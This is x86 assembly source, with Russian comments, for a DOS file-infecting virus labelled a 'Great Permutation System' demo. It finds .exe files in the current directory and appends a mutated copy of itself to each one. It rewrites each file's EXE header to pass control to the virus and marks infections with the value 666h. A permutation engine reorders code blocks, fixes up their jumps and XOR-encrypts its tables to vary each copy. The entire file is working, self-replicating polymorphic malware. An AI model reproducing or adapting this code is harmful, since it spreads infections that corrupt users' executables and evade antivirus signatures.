.386
assume cs:Xseg,ss:Sseg
Xseg segment use16                      ;это якобы зараженная программа
                        mov ah,9
                        lea dx,Mess1
                        push cs
                        pop ds
                        int 21h
                        mov ax,4c00h
                        int 21h

Mess1:                  db 'Welcome to hell!$'
Xseg ends
;--------------------------- начало кода ---------------------------------------
assume cs:Vseg
Vseg segment use16                      
;#CodeStart
Start:                  pusha

                        mov ax,ds
                        add cs:[Old_cs],ax ;настраиваем значения
                        add cs:[Old_ss],ax ;cs и ss

                        call VirMain ;#CALL
                                     ;вызываем основной алгоритм

                        popa
                        cli
                        mov ss,cs:[Old_ss]
                        mov sp,cs:[Old_sp]
                        sti
                        jmp dword ptr cs:[Old_ip] ;#WARP
                                          ;возврат в зараженную программу

VirMain                 proc near ;#PROC
                        push ds
                        push es

                        mov ah,1ah
                        lea dx,[DTA]
                        push cs
                        push cs
                        pop ds
                        pop es
                        int 21h ;устанавливаем DTA

                        call Randomize ;#CALL
                                ;инициализируем генератор случайных чисел

                        mov cx,offset Code2-offset XorKey
                        lea si,[XorKey]
                        mov al,ds:[si]
vm1:                    xor ds:[si],al ;расшифровываем таблицы и другие
                                       ;необходимые для работы данные
                        inc si
                        loop vm1 ;#Jxx

                        mov ah,4eh
                        mov cx,63
                        lea dx,[Exe]
                        int 21h ;ищем первый exe-файл

vm2:                    jc vm3 ;#Jxx
                        call Infect ;#CALL
                                    ;вызов процедуры заражения
                        mov ah,4fh
                        int 21h ;ищем следующий exe-файл
                        jmp vm2 ;#JMP

vm3:                    pop es
                        pop ds
                        mov ah,1ah
                        mov dx,80h
                        int 21h ;восстанавливаем DTA
                                ;(на значение PSP:80h)

                        ret ;#WARP
VirMain                 endp ;#PROC

Infect                  proc near ;#PROC
                                  ;процедура заражения
                                  ;имя файла - в DTA
                        mov ax,3d02h
                        lea dx,[DTA+1eh]
                        int 21h ;открываем файл
                        jc in1 ;#Jxx
                        mov bx,ax

                        mov ah,3fh
                        mov cx,1ch
                        lea dx,[Header]
                        int 21h ;читаем exe-header

                        cmp word ptr ds:[Header],'ZM' ;проверяем формат файла
                        jne in2 ;#Jxx
                        cmp word ptr ds:[Header+12h],666h ;метка заражения -
                                                          ;контрольная сумма
                                                          ;равна 666h
                        je in2 ;#Jxx
                        cmp word ptr ds:[Header+4],600 ;проверяем размер
                                                       ;(если больше 300k -
                                                       ;выход)
                        ja in2 ;#Jxx

                        mov ax,word ptr ds:[Header+0eh]
                        add ax,10h
                        mov ds:[Old_ss2],ax ;сохраняем начальное значение ss
                        mov ax,word ptr ds:[Header+10h]
                        mov ds:[Old_sp2],ax ;сохраняем начальное значение sp
                        mov ax,word ptr ds:[Header+14h]
                        mov ds:[Old_ip2],ax ;сохраняем начальное значение ip
                        mov ax,word ptr ds:[Header+16h]
                        add ax,10h
                        mov ds:[Old_cs2],ax ;сохраняем начальное значение cs

                        call CreateCopy ;#CALL
                                        ;вызываем процедуру мутации,
                                        ;она возвращает в ax новое
                                        ;начальное значение ip
                        mov word ptr ds:[Header+14h],ax

                        mov ax,4202h
                        xor cx,cx
                        xor dx,dx
                        int 21h ;перемещаем файловый указатель в конец файла

                        add ax,15
                        adc dx,0
                        mov cx,16
                        div cx ;теперь в ax - размер файла в параграфах
                        mov dx,ax
                        sub dx,word ptr ds:[Header+8] ;отнимаем длину
                                                      ;заголовка
                        mov word ptr ds:[Header+16h],dx ;записываем новое
                                                        ;начальное значение cs

                        mul cx
                        mov cx,dx
                        mov dx,ax
                        mov ax,4200h
                        int 21h ;выравниваем длину файла на границу параграфа

                        add ax,offset Code2-offset Start
                        adc dx,0 ;добавляем длину вируса
                                 ;теперь в dx:ax - длина файла после заражения

                        push ax
                        push dx
                        add ax,511
                        adc dx,0
                        mov cx,512
                        div cx
                        mov word ptr ds:[Header+2],dx ;записываем новое число
                                                      ;байт в последнем
                                                      ;секторе файла
                        mov word ptr ds:[Header+4],ax ;записываем длину файла
                                                      ;в секторах

                        pop dx
                        pop ax
                        add ax,offset DataEnd-offset Code2+15
                        adc dx,0 ;прибавляем к новой длине файла длину
                                 ;области данных
                        mov cx,16
                        div cx
                        sub ax,word ptr ds:[Header+8]
                        mov word ptr ds:[Header+0eh],ax ;устанавливаем
                                                        ;сегмент стека -
                                                        ;сразу за областью
                                                        ;данных
                        mov word ptr ds:[Header+10h],4096 ;sp=4096

                        mov word ptr ds:[Header+12h],666h ;признак заражения

                        mov ah,40h
                        mov cx,offset Code2-offset Start
                        lea dx,[Code2]
                        int 21h ;записываем код

                        mov ax,4200h
                        xor cx,cx
                        xor dx,dx
                        int 21h ;перемещаем указатель в начало файла

                        mov ah,40h
                        mov cx,1ch
                        lea dx,[Header]
                        int 21h ;записываем заголовок файла

in2:                    mov ah,3eh
                        int 21h ;закрываем файл

in1:                    ret ;#WARP
Infect                  endp ;#PROC

CreateCopy              proc near ;#PROC
                                  ;процедура создает по адресу Code2
                                  ;мутировавшую копию кода и соответствующие
                                  ;таблицы, в ax - новое смещение entry point
                        push bx

                        mov cx,offset Code2-offset XorKey
                        lea si,[XorKey]
                        lea di,[XorKey2]
                        cld
                    rep movsb ;копируем таблицы, copyright и строку '*.exe'

                        mov cx,N*2
cc1:                    mov ax,N
                        call Random ;#CALL
                        mov si,ax
                        shl si,1
                        add si,offset BlockPos2-offset Start
                        mov ax,N
                        call Random ;#CALL
                        mov di,ax
                        shl di,1
                        add di,offset BlockPos2-offset Start
                        push word ptr ds:[si]
                        push word ptr ds:[di]
                        pop word ptr ds:[si]
                        pop word ptr ds:[di] ;меняем местами два элемента
                                             ;таблицы BlockOfs2 со случайными
                                             ;индексами - повторяется 2N раз
                        loop cc1 ;#Jxx

                        lea si,[BlockPos]
                        lea di,[BlockOfs]
                        call FindOffsets ;#CALL
                                         ;создаем таблицу смещений
                                         ;для оригинального варианта кода
                        lea si,[BlockPos2]
                        lea di,[BlockOfs2]
                        call FindOffsets ;#CALL
                                         ;создаем таблицу смещений
                                         ;для копии

                        xor bx,bx ;bx - счетчик номера блока
cc2:                    mov al,ds:[BlockSize+bx]
                        mov cl,al
                        shr al,6 ;al - число настраиваемых адресов в блоке
                        and cx,111111b ;cx - длина блока
                        mov si,bx
                        shl si,1
                        mov di,ds:[BlockOfs2+si]
                        add di,offset Code2-offset Start ;di - смещение блока
                                                         ;в копии
                        mov si,ds:[BlockOfs+si] ;si - смещение блока в
                                                ;исходном коде
                    rep movsb ;копируем блок

                        cmp al,0 ;al=0 - нет настраиваемых адресов
                        je cc3 ;#Jxx
                        cmp al,1 ;al=1 - 1 настраиваемый адрес
                        je cc4 ;#Jxx
                                        ;иначе - 2 настраиваемых адреса

                        mov ax,ds:[si-5] ;в [si-5] - относительный адрес
                                         ;перехода
                        add ax,si
                        sub ax,3 ;прибавляем si-3 => в ax абсолютный адрес
                                 ;точки назначения в исходном коде
                        call FindTarget ;#CALL
                                 ;теперь в ax - абсолютный адрес точки
                                 ;назначения в мутировавшей копии
                        sub ax,di
                        add ax,3 ;отнимаем di-3 и получаем относительный
                                 ;адрес перехода
                        mov ds:[di-5],ax ;сохраняем его

cc4:                    mov ax,ds:[si-2] ;в [si-2] - относительный адрес
                                         ;перехода
                        add ax,si ;прибавляем si => в ax абсолютный адрес
                                  ;точки назначения в исходном коде
                        call FindTarget ;#CALL
                                  ;теперь в ax - абсолютный адрес точки
                                  ;назначения в мутировавшей копии
                        sub ax,di ;отнимаем di и получаем относительный
                                  ;адрес перехода
                        mov ds:[di-2],ax ;сохраняем его

cc3:                    inc bx ;переходим к следуещему блоку
                        cmp bx,N
                        jb cc2 ;#Jxx

                        mov bx,ds:[BlockOfs2] ;bx=BlockOfs2[0] -
                                              ;смещение точки входа
cc5:                    mov ax,256
                        call Random ;#CALL
                                ;находим случайное число для шифровки таблиц
                        or ax,ax
                        jz cc5 ;#Jxx
                        mov cx,offset Code2-offset XorKey
                        lea si,[XorKey2]
cc6:                    xor ds:[si],al ;зашифровываем таблицы
                        inc si
                        loop cc6 ;#Jxx
                        mov ax,bx ;смещение точки входа - в ax

                        pop bx
                        ret ;#WARP
CreateCopy              endp ;#PROC

FindOffsets             proc near ;#PROC
                                ;процедура заполняет таблицы смещений блоков,
                                ;на входе: si указывает на таблицу порядка
                                ;расположения блоков, di - на область,
                                ;в которую надо записать результат
                        mov cx,N
                        xor dx,dx ;dx - счетчик номера блока
fo1:                    xor bp,bp ;bp - смещение блока
                        xor bx,bx
                        push di
fo2:                    mov di,ds:[si+bx]
                        cmp di,dx ;ищем в исходной таблице блок номер dx
                        je fo3 ;#Jxx
                               ;если нашли - выход из цикла
                        mov al,ds:[di+BlockSize]
                        and ax,111111b
                        add bp,ax ;если не нашли - прибавляем к смещению
                                  ;длину очередного блока
                        inc bx
                        inc bx
                        jmp fo2 ;#JMP
fo3:                    pop di
                        mov ax,bp
                        stosw ;сохраняем смещение
                        inc dx ;переходим к следующему блоку
                        loop fo1 ;#Jxx
                        ret ;#WARP
FindOffsets             endp ;#PROC

FindTarget              proc near ;#PROC
                                ;на входе: в ax - абсолютное смещение
                                ;некоторого блока в исходном коде,
                                ;на выходе: в ax - абсолютное смещение
                                ;того же блока в мутировавшем коде
                        push bx
                        xor bx,bx ;bx - счетчик номера блока
ft1:                    cmp ds:[BlockOfs+bx],ax ;ищем блок, смещение
                                                ;которого равно входному
                                                ;значению
                        je ft2 ;#Jxx
                               ;если нашли, то в bx номер блока
                        inc bx
                        inc bx
                        jmp ft1 ;#JMP
ft2:                    mov ax,ds:[BlockOfs2+bx] ;берем из таблицы BlockOfs2
                                                 ;смещение нужного блока
                                                 ;в мутировавшем коде
                        add ax,offset Code2-offset Start ;прибавляем начальное
                                                         ;смещение копии
                        pop bx
                        ret ;#WARP
FindTarget              endp ;#PROC

                        ;Далее идет генератор псевдослучайных чисел -
                        ;я вытащил его из Турбо Паскаля, так что все
                        ;вопросы об алгоритме - к фирме Borland.
                        ;Randomize - инициализирует генератор,
                        ;Random - на входе: ax=Range
                        ;         на выходе: ax=случайное число,
                        ;                    0<=ax<Range

Randomize               proc near ;#PROC
                        mov ah,2ch
                        int 21h
                        mov word ptr ds:[RandSeed],cx
                        mov word ptr ds:[RandSeed+2],dx
                        ret ;#WARP
Randomize               endp ;#PROC

Random                  proc near ;#PROC
                        push bx
                        push cx
                        push dx
                        push si
                        mov si,ax
                        mov ax,word ptr ds:[RandSeed]
                        mov bx,word ptr ds:[RandSeed+2]
                        mov cx,ax
                        mul ds:[RandMagic]
                        shl cx,3
                        add ch,cl
                        add dx,cx
                        add dx,bx
                        shl bx,2
                        add dx,bx
                        add dh,bl
                        shl bx,5
                        add dh,bl
                        add ax,1
                        adc dx,0
                        mov word ptr ds:[RandSeed],ax
                        mov word ptr ds:[RandSeed+2],dx
                        mov cx,dx
                        mul si
                        mov ax,cx
                        mov cx,dx
                        mul si
                        add ax,cx
                        adc dx,0
                        mov ax,dx
                        pop si
                        pop dx
                        pop cx
                        pop bx
                        ret ;#WARP
Random                  endp ;#PROC
;#CodeEnd

;----------------------- конец кода --------------------------------------------
Old_ip                  dw 0
Old_cs                  dw 10h
Old_sp                  dw 4096
Old_ss                  dw 10h
XorKey                  db 0 ;ключ для шифровки таблиц
ExData:                      ;в интервале от ExData до BlockPos
                             ;помещаются все дополнительные данные,
                             ;которые должны быть сохранены в файле
Exe                     db '*.exe',0
RandMagic               dw 8405h
Copyright               db 13,10
                        db ' Great Permutation System demo program'
                        db 13,10
                        db ' Copyright (C) 1999 by Tahorg'
                        db 13,10

N                       equ 110h        ;число блоков в коде         ┐ 
BlockPos                dw N dup (?)    ;таблица расположения блоков │ 
BlockSize               db N dup (?)    ;таблица длин блоков         ┘ 
					;в prc-файле три предыдущие строки
					;должны быть заменены на
					;содержимое tbl-файла
					;(можно написать include gps.tbl)
;----------------------- начало run-time данных --------------------------------
Code2                   db (Old_ip-Start) dup (?) ;место для копии кода
Old_ip2                 dw (?)
Old_cs2                 dw (?)
Old_sp2                 dw (?)
Old_ss2                 dw (?)
XorKey2                 db (?)
Data2                   db (BlockPos-ExData) dup (?)
BlockPos2               dw N dup (?) ;место для новой таблицы 
				     ;расположения блоков
BlockSize2              db N dup (?) ;место для копии таблицы длин блоков
;----------------------- начало данных, которые не сохраняются на диск ---------
BlockOfs                dw N dup (?) ;таблица смещений блоков исходного кода
BlockOfs2               dw N dup (?) ;таблица смещений блоков копии
Header                  db 1ch dup (?)
DTA                     db 43 dup (?)
RandSeed                dd (?)
DataEnd:
Vseg ends
;------------------------------------------------------------------------------
Sseg segment use16 stack
                        db 4096 dup (?)
Sseg ends
end Start
